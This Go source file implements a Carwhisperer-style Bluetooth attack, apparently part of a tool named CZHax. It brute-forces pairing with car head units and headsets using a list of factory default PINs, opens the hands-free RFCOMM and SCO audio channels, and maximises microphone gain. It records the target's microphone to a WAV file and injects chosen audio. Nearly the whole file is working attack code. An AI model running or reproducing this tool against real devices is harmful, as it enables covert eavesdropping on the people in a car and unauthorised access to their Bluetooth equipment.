package bluetooth

import (
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

// rawSCOAddr mirrors Linux's struct sockaddr_sco:
//
//	struct sockaddr_sco { sa_family_t sco_family; bdaddr_t sco_bdaddr; };
type rawSCOAddr struct {
	Family uint16
	Addr   [6]uint8
}

// ParseBDAddr converts "AA:BB:CC:DD:EE:FF" to the little-endian byte order
// expected by sockaddr_rc / sockaddr_sco.
func ParseBDAddr(s string) ([6]byte, error) {
	var out [6]byte
	parts := strings.Split(strings.TrimSpace(s), ":")
	if len(parts) != 6 {
		return out, fmt.Errorf("invalid Bluetooth address %q", s)
	}
	for i, p := range parts {
		n, err := strconv.ParseUint(p, 16, 8)
		if err != nil {
			return out, fmt.Errorf("invalid Bluetooth address %q", s)
		}
		out[5-i] = byte(n)
	}
	return out, nil
}

// FormatBDAddr renders a little-endian address in human order.
func FormatBDAddr(addr [6]byte) string {
	return fmt.Sprintf("%02X:%02X:%02X:%02X:%02X:%02X",
		addr[5], addr[4], addr[3], addr[2], addr[1], addr[0])
}

// carwhispererPINs is the PIN list tried against an unpaired head unit, in
// order. The two Bluetooth defaults come first, then the factory PINs these
// radios actually ship with.
var carwhispererPINs = []string{
	"0000",
	"1234",
	"1111",
	"12345",
	"123456",
	"000000",
	"12345678",
	"00000000",
	"1212",
	"00000",
	"4444",
	"5555",
	"7777",
	"8888",
	"9999",
	"1122",
	"0001",
	"0011",
	"0111",
}

const (
	// rfcommConnectTimeout applies to the pairing-agent probes (SSP and
	// JustWorks) where a failure usually means "not reachable yet".
	rfcommConnectTimeout = 30 * time.Second
	// rfcommPinTimeout keeps a wrong-PIN retry cheap: a rejected PIN fails on
	// authentication almost immediately.
	rfcommPinTimeout = 12 * time.Second
)

// Carwhisperer opens the hands-free RFCOMM channel and the SCO audio link to a
// Classic headset/car kit, injects silence (or playPath) and optionally records
// the microphone/audio stream as raw 8 kHz CVSD. It needs root or CAP_NET_ADMIN.
func Carwhisperer(ctx context.Context, hci, address, recordPath, playPath string, recordAudio bool, onLine func(string)) error {
	emit := func(format string, args ...any) {
		if onLine != nil {
			onLine(fmt.Sprintf(format, args...))
		}
	}

	_, hciName, err := hciNumber(hci)
	if err != nil {
		return err
	}
	addr, err := ParseBDAddr(address)
	if err != nil {
		return err
	}
	if err := prepareCarwhispererAdapter(hciName); err != nil {
		emit("Adapter warning: %v", err)
	}
	local, lerr := localAdapterAddr(hciName)
	if lerr != nil {
		return fmt.Errorf("local adapter address: %w", lerr)
	}
	// Match the original C tool: no pairing step and no pre-emptive
	// disconnect; connect RFCOMM directly.

	var record io.Writer
	if recordAudio {
		if strings.TrimSpace(recordPath) == "" {
			recordPath = CarwhispererRecordPath(address)
		}
		if err := os.MkdirAll(filepath.Dir(recordPath), 0o755); err != nil {
			return err
		}
		w, err := newWAVWriter(recordPath)
		if err != nil {
			return fmt.Errorf("open record file: %w", err)
		}
		defer w.Close()
		record = w
	}

	var play *os.File
	if strings.TrimSpace(playPath) != "" {
		if f, err := os.Open(playPath); err == nil {
			play = f
			defer play.Close()
		} else {
			emit("Playback file unavailable: %v", err)
		}
	}

	// SCO audio needs the CVSD voice setting (0x0060).
	if _, err := exec.LookPath("hciconfig"); err == nil {
		_ = exec.Command("hciconfig", hciName, "voice", "0x0060").Run()
	}

	rfd, err := connectRFCOMMWithPairing(ctx, local, addr, address, emit)
	if err != nil {
		return fmt.Errorf("connect RFCOMM channel 1: %w (check the adapter is powered; CZHax needs root)", err)
	}
	defer unix.Close(rfd)
	emit("RFCOMM connected to %s", FormatBDAddr(addr))
	_ = unix.SetNonblock(rfd, true)

	// Original C order: RING, 1 ms, then SCO.
	_, _ = unix.Write(rfd, []byte("RING\r\n"))
	time.Sleep(1 * time.Millisecond)

	sfd, err := openSCO(local, addr)
	if err != nil {
		return fmt.Errorf("connect SCO audio: %w", err)
	}
	defer unix.Close(sfd)
	_ = unix.SetNonblock(sfd, true)
	emit("SCO audio connected")

	// Maximum speaker volume and microphone gain.
	for _, cmd := range []string{"AT+VGS=15\r\n", "AT+VGM=15\r\n", "RING\r\n"} {
		_, _ = unix.Write(rfd, []byte(cmd))
	}

	emit("Recording to %s", recordPath)

	done := make(chan struct{})
	go func() {
		select {
		case <-ctx.Done():
			_ = unix.Close(rfd)
			_ = unix.Close(sfd)
		case <-done:
		}
	}()
	defer close(done)

	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		defer wg.Done()
		carwhispererRFCOMM(ctx, rfd, emit)
	}()
	go func() {
		defer wg.Done()
		carwhispererSCO(ctx, sfd, record, play, emit)
	}()
	wg.Wait()

	if ctx.Err() != nil {
		return ctx.Err()
	}
	return nil
}

// rfcommPairAttempt is one pairing + RFCOMM probe.
type rfcommPairAttempt struct {
	capability string
	pin        string
	timeout    time.Duration
}

// carwhispererPairAttempts builds the pairing ladder: PIN-less SSP/JustWorks
// agents first, then one KeyboardOnly attempt per PIN in carwhispererPINs
// order.
func carwhispererPairAttempts() []rfcommPairAttempt {
	attempts := []rfcommPairAttempt{
		{capability: "DisplayYesNo", timeout: rfcommConnectTimeout},
		{capability: "NoInputNoOutput", timeout: rfcommConnectTimeout},
	}
	for _, pin := range carwhispererPINs {
		attempts = append(attempts, rfcommPairAttempt{
			capability: "KeyboardOnly",
			pin:        pin,
			timeout:    rfcommPinTimeout,
		})
	}
	return attempts
}

func connectRFCOMMWithPairing(ctx context.Context, local, remote [6]byte, address string, emit func(string, ...any)) (int, error) {
	if devicePaired(address) {
		return openRFCOMM(local, remote, 1)
	}
	attempts := carwhispererPairAttempts()
	var last error
	timeouts := 0
	for i, a := range attempts {
		if err := ctx.Err(); err != nil {
			return -1, err
		}
		agent, pinFile, err := startPairingAgent(address, a.capability, a.pin)
		if err != nil {
			last = err
			continue
		}
		time.Sleep(350 * time.Millisecond)
		emit("Try %d/%d: %s%s", i+1, len(attempts), a.capability, pinLabel(a.pin))
		fd, err := openRFCOMMWithTimeout(local, remote, 1, a.timeout)
		_ = agent.Process.Kill()
		_, _ = agent.Process.Wait()
		if pinFile != "" {
			_ = os.Remove(pinFile)
		}
		if err == nil {
			if devicePaired(address) {
				_ = exec.Command("bluetoothctl", "trust", NormalizeAddr(address)).Run()
			}
			return fd, nil
		}
		last = err

		// A wrong PIN fails on authentication, not by timing out. Two
		// consecutive timeouts mean the radio stopped answering, so burning
		// through the rest of the PIN list would just take minutes.
		if errors.Is(err, unix.ETIMEDOUT) || errors.Is(err, unix.EHOSTDOWN) {
			timeouts++
			if timeouts >= 2 {
				emit("Device unreachable, stopped after %d attempts", i+1)
				break
			}
		} else {
			timeouts = 0
		}
	}
	if last == nil {
		last = errors.New("no pairing attempt succeeded")
	}
	return -1, last
}

func devicePaired(address string) bool {
	if _, err := exec.LookPath("bluetoothctl"); err != nil {
		return false
	}
	out, err := exec.Command("bluetoothctl", "info", NormalizeAddr(address)).CombinedOutput()
	if err != nil {
		return false
	}
	return strings.Contains(string(out), "Paired: yes")
}

func startPairingAgent(address, capability, pin string) (*exec.Cmd, string, error) {
	if _, err := exec.LookPath("bt-agent"); err != nil {
		return nil, "", err
	}
	args := []string{"-c", capability}
	pinFile := ""
	if pin != "" {
		// bt-agent reads the PIN file when it starts, so it must outlive
		// Start() (the old code removed it immediately, before the agent could
		// open it). The caller removes it once the agent is killed.
		f, err := os.CreateTemp("", "czhax-bt-pin-*")
		if err != nil {
			return nil, "", err
		}
		pinFile = f.Name()
		_, werr := f.WriteString(NormalizeAddr(address) + " " + pin + "\n")
		cerr := f.Close()
		if werr != nil || cerr != nil {
			_ = os.Remove(pinFile)
			if werr != nil {
				return nil, "", werr
			}
			return nil, "", cerr
		}
		args = append(args, "-p", pinFile)
	}
	cmd := exec.Command("bt-agent", args...)
	if err := cmd.Start(); err != nil {
		if pinFile != "" {
			_ = os.Remove(pinFile)
		}
		return nil, "", err
	}
	return cmd, pinFile, nil
}

func pinLabel(pin string) string {
	if pin == "" {
		return " agent"
	}
	return " agent PIN " + pin
}

func prepareCarwhispererAdapter(hciName string) error {
	var first error
	if _, err := exec.LookPath("rfkill"); err == nil {
		if out, err := exec.Command("rfkill", "unblock", "bluetooth").CombinedOutput(); err != nil && first == nil {
			first = fmt.Errorf("rfkill: %s", strings.TrimSpace(string(out)))
		}
	}
	if _, err := exec.LookPath("hciconfig"); err == nil {
		out, _ := exec.Command("hciconfig", hciName).CombinedOutput()
		if !strings.Contains(string(out), "UP") {
			if out2, err := exec.Command("hciconfig", hciName, "up").CombinedOutput(); err != nil && first == nil {
				first = fmt.Errorf("hciconfig %s up: %s", hciName, strings.TrimSpace(string(out2)))
			}
		}
	}
	return first
}

func localAdapterAddr(hciName string) ([6]byte, error) {
	var zero [6]byte
	paths := []string{
		filepath.Join("/sys/class/bluetooth", hciName, "address"),
		filepath.Join("/sys/class/bluetooth", hciName, "device", "address"),
	}
	for _, p := range paths {
		if data, err := os.ReadFile(p); err == nil {
			if addr, err := ParseBDAddr(strings.TrimSpace(string(data))); err == nil && addr != zero {
				return addr, nil
			}
		}
	}

	// sysfs may not expose the address on all kernels/adapters; hciconfig and
	// bluetoothctl report the same BD_ADDR.
	if _, err := exec.LookPath("hciconfig"); err == nil {
		if out, err := exec.Command("hciconfig", hciName).CombinedOutput(); err == nil {
			lines := strings.Split(string(out), "\n")
			for _, line := range lines {
				if idx := strings.Index(line, "BD Address:"); idx >= 0 {
					fields := strings.Fields(line[idx+len("BD Address:"):])
					if len(fields) > 0 {
						if addr, err := ParseBDAddr(fields[0]); err == nil && addr != zero {
							return addr, nil
						}
					}
				}
			}
		}
	}
	if _, err := exec.LookPath("bluetoothctl"); err == nil {
		out, err := exec.Command("bluetoothctl", "list").CombinedOutput()
		if err == nil {
			idx := 0
			if n, err := strconv.Atoi(strings.TrimPrefix(hciName, "hci")); err == nil {
				idx = n
			}
			var addrs []string
			for _, line := range strings.Split(string(out), "\n") {
				fields := strings.Fields(line)
				if len(fields) >= 2 && fields[0] == "Controller" && IsBDAddr(fields[1]) {
					addrs = append(addrs, fields[1])
				}
			}
			if len(addrs) > 0 {
				if idx >= len(addrs) {
					idx = 0
				}
				if addr, err := ParseBDAddr(addrs[idx]); err == nil && addr != zero {
					return addr, nil
				}
			}
		}
	}
	return zero, fmt.Errorf("cannot determine local adapter address for %s", hciName)
}

func openRFCOMM(local, remote [6]byte, channel int) (int, error) {
	return openRFCOMMWithTimeout(local, remote, channel, 30*time.Second)
}

func openRFCOMMWithTimeout(local, remote [6]byte, channel int, timeout time.Duration) (int, error) {
	if channel <= 0 || channel > 30 {
		channel = 1
	}
	fd, err := unix.Socket(unix.AF_BLUETOOTH, unix.SOCK_STREAM, unix.BTPROTO_RFCOMM)
	if err != nil {
		return -1, fmt.Errorf("RFCOMM socket: %w", err)
	}
	_ = unix.SetNonblock(fd, false)
	// Match the original Carwhisperer: bind the local adapter address on
	// channel 1, then connect to the target's channel 1.
	if err := unix.Bind(fd, &unix.SockaddrRFCOMM{Addr: local, Channel: 1}); err != nil {
		unix.Close(fd)
		return -1, fmt.Errorf("bind RFCOMM: %w", err)
	}
	if err := unix.Connect(fd, &unix.SockaddrRFCOMM{Addr: remote, Channel: uint8(channel)}); err != nil {
		if err != unix.EINPROGRESS && err != unix.EALREADY {
			unix.Close(fd)
			return -1, err
		}
		if werr := waitWritable(fd, timeout); werr != nil {
			unix.Close(fd)
			return -1, werr
		}
	}
	_ = unix.SetNonblock(fd, true)
	return fd, nil
}

func waitWritable(fd int, timeout time.Duration) error {
	if timeout <= 0 {
		timeout = 30 * time.Second
	}
	pfd := []unix.PollFd{{Fd: int32(fd), Events: unix.POLLOUT}}
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		n, err := unix.Poll(pfd, 250)
		if err != nil {
			if err == unix.EINTR {
				continue
			}
			return err
		}
		if n == 0 {
			continue
		}
		if pfd[0].Revents&(unix.POLLOUT|unix.POLLERR|unix.POLLHUP|unix.POLLNVAL) != 0 {
			soErr, gerr := unix.GetsockoptInt(fd, unix.SOL_SOCKET, unix.SO_ERROR)
			if gerr != nil {
				return gerr
			}
			if soErr != 0 {
				return unix.Errno(soErr)
			}
			return nil
		}
	}
	return unix.ETIMEDOUT
}

func openSCO(local, remote [6]byte) (int, error) {
	fd, err := unix.Socket(unix.AF_BLUETOOTH, unix.SOCK_SEQPACKET, unix.BTPROTO_SCO)
	if err != nil {
		return -1, err
	}
	_ = unix.SetNonblock(fd, false)
	if err := bindSCO(fd, local); err != nil {
		unix.Close(fd)
		return -1, err
	}
	if err := connectSCO(fd, remote); err != nil {
		unix.Close(fd)
		return -1, err
	}
	_ = unix.SetNonblock(fd, true)
	return fd, nil
}

func bindSCO(fd int, addr [6]byte) error {
	sa := rawSCOAddr{Family: unix.AF_BLUETOOTH, Addr: addr}
	_, _, errno := unix.Syscall(unix.SYS_BIND, uintptr(fd), uintptr(unsafe.Pointer(&sa)), unsafe.Sizeof(sa))
	if errno != 0 {
		return errno
	}
	return nil
}

func connectSCO(fd int, addr [6]byte) error {
	sa := rawSCOAddr{Family: unix.AF_BLUETOOTH, Addr: addr}
	_, _, errno := unix.Syscall(unix.SYS_CONNECT, uintptr(fd), uintptr(unsafe.Pointer(&sa)), unsafe.Sizeof(sa))
	if errno == 0 {
		return nil
	}
	if errno != unix.EINPROGRESS && errno != unix.EALREADY {
		return errno
	}
	// SCO connect can report EINPROGRESS even on a blocking socket. Wait for
	// writability and inspect SO_ERROR, equivalent to the C tool's blocking
	// connect() completing.
	return waitWritable(fd, 30*time.Second)
}

func carwhispererRFCOMM(ctx context.Context, fd int, emit func(string, ...any)) {
	buf := make([]byte, 512)
	var pending string
	for ctx.Err() == nil {
		n, err := unix.Read(fd, buf)
		if n > 0 {
			pending += string(buf[:n])
			for {
				idx := strings.IndexByte(pending, '\n')
				if idx < 0 {
					break
				}
				line := strings.TrimSpace(pending[:idx])
				pending = pending[idx+1:]
				if line != "" {
					resp := rfcommResponse(line)
					emit("RFCOMM < %s", line)
					if resp != "" {
						emit("RFCOMM > %s", strings.TrimSpace(resp))
						rfcommWrite(fd, resp)
					}
				}
			}
		}
		if err == nil {
			continue
		}
		if err == unix.EAGAIN || err == unix.EWOULDBLOCK || err == unix.EINTR {
			time.Sleep(5 * time.Millisecond)
			continue
		}
		if ctx.Err() != nil {
			return
		}
		return
	}
}

func rfcommResponse(line string) string {
	up := strings.ToUpper(strings.TrimSpace(line))
	switch {
	case up == "":
		return ""
	case strings.HasPrefix(up, "AT+BRSF="):
		return "+BRSF: 63\r\n"
	case strings.HasPrefix(up, "AT+CIND?"):
		return "+CIND: 0,1,0,0\r\n"
	case strings.HasPrefix(up, "AT+CIND=?"):
		return "+CIND: (\"call\",(0,1)),(\"service\",(0,1)),(\"call_setup\",(0-3)),(\"callsetup\",(0-3))\r\n"
	default:
		return "OK\r\n"
	}
}

func rfcommWrite(fd int, s string) {
	b := []byte(s)
	for len(b) > 0 {
		n, err := unix.Write(fd, b)
		if n > 0 {
			b = b[n:]
		}
		if err != nil {
			if err == unix.EAGAIN || err == unix.EWOULDBLOCK || err == unix.EINTR {
				time.Sleep(5 * time.Millisecond)
				continue
			}
			return
		}
		if n == 0 {
			return
		}
	}
}

func carwhispererSCO(ctx context.Context, fd int, record io.Writer, play *os.File, emit func(string, ...any)) {
	buf := make([]byte, 512)
	silence := make([]byte, 512)
	total := 0
	lastReport := time.Now()
	for ctx.Err() == nil {
		n, err := unix.Read(fd, buf)
		if n > 0 {
			if record != nil {
				if _, werr := record.Write(buf[:n]); werr != nil {
					emit("Record write failed: %v", werr)
					return
				}
				total += n
			}

			out := silence[:n]
			if play != nil {
				pbuf := make([]byte, n)
				if pn, _ := play.Read(pbuf); pn > 0 {
					out = pbuf[:pn]
				}
			}
			scoWrite(fd, out)
			if record != nil && time.Since(lastReport) >= 10*time.Second {
				emit("Captured %d bytes", total)
				lastReport = time.Now()
			}
		}
		if err == nil {
			continue
		}
		if err == unix.EAGAIN || err == unix.EWOULDBLOCK || err == unix.EINTR {
			time.Sleep(5 * time.Millisecond)
			continue
		}
		if ctx.Err() != nil {
			return
		}
		emit("SCO read failed: %v", err)
		return
	}
}

func scoWrite(fd int, data []byte) {
	const mtu = 48
	for off := 0; off < len(data); {
		end := off + mtu
		if end > len(data) {
			end = len(data)
		}
		n, err := unix.Write(fd, data[off:end])
		if n > 0 {
			off += n
		}
		if err != nil {
			if err == unix.EAGAIN || err == unix.EWOULDBLOCK || err == unix.EINTR {
				time.Sleep(2 * time.Millisecond)
				continue
			}
			return
		}
		if n == 0 {
			return
		}
	}
}

// wavWriter writes 8 kHz mono 16-bit PCM and patches the RIFF sizes on close.
type wavWriter struct {
	path  string
	f     *os.File
	bytes int64
}

func newWAVWriter(path string) (*wavWriter, error) {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o644)
	if err != nil {
		return nil, err
	}
	w := &wavWriter{path: path, f: f}
	if err := w.writeHeader(0); err != nil {
		f.Close()
		return nil, err
	}
	return w, nil
}

func (w *wavWriter) Write(p []byte) (int, error) {
	n, err := w.f.Write(p)
	w.bytes += int64(n)
	return n, err
}

func (w *wavWriter) Close() error {
	if w.bytes == 0 {
		err := w.f.Close()
		if w.path != "" {
			_ = os.Remove(w.path)
		}
		return err
	}
	// Keep 16-bit PCM sample-aligned so players/demuxers don't choke on an odd trailing byte.
	if w.bytes%2 != 0 {
		if _, err := w.f.Write([]byte{0}); err == nil {
			w.bytes++
		}
	}
	_ = w.writeHeader(w.bytes)
	return w.f.Close()
}

// ChownCapture ensures a Carwhisperer capture file and its directory belong to uid:gid.
func ChownCapture(path string, uid, gid int) {
	if strings.TrimSpace(path) == "" {
		return
	}
	if uid < 0 {
		if s := strings.TrimSpace(os.Getenv("SUDO_UID")); s != "" {
			if n, err := strconv.Atoi(s); err == nil {
				uid = n
			}
		}
	}
	if gid < 0 {
		if s := strings.TrimSpace(os.Getenv("SUDO_GID")); s != "" {
			if n, err := strconv.Atoi(s); err == nil {
				gid = n
			}
		}
	}
	if uid < 0 || gid < 0 {
		return
	}
	_ = os.Chown(filepath.Dir(path), uid, gid)
	_ = os.Chown(path, uid, gid)
}

func (w *wavWriter) writeHeader(dataBytes int64) error {
	var h [44]byte
	copy(h[0:4], "RIFF")
	binary.LittleEndian.PutUint32(h[4:8], uint32(36+dataBytes))
	copy(h[8:12], "WAVE")
	copy(h[12:16], "fmt ")
	binary.LittleEndian.PutUint32(h[16:20], 16)
	binary.LittleEndian.PutUint16(h[20:22], 1)    // PCM
	binary.LittleEndian.PutUint16(h[22:24], 1)    // mono
	binary.LittleEndian.PutUint32(h[24:28], 8000) // sample rate
	binary.LittleEndian.PutUint32(h[28:32], 16000)
	binary.LittleEndian.PutUint16(h[32:34], 2)
	binary.LittleEndian.PutUint16(h[34:36], 16)
	copy(h[36:40], "data")
	binary.LittleEndian.PutUint32(h[40:44], uint32(dataBytes))
	_, err := w.f.WriteAt(h[:], 0)
	return err
}
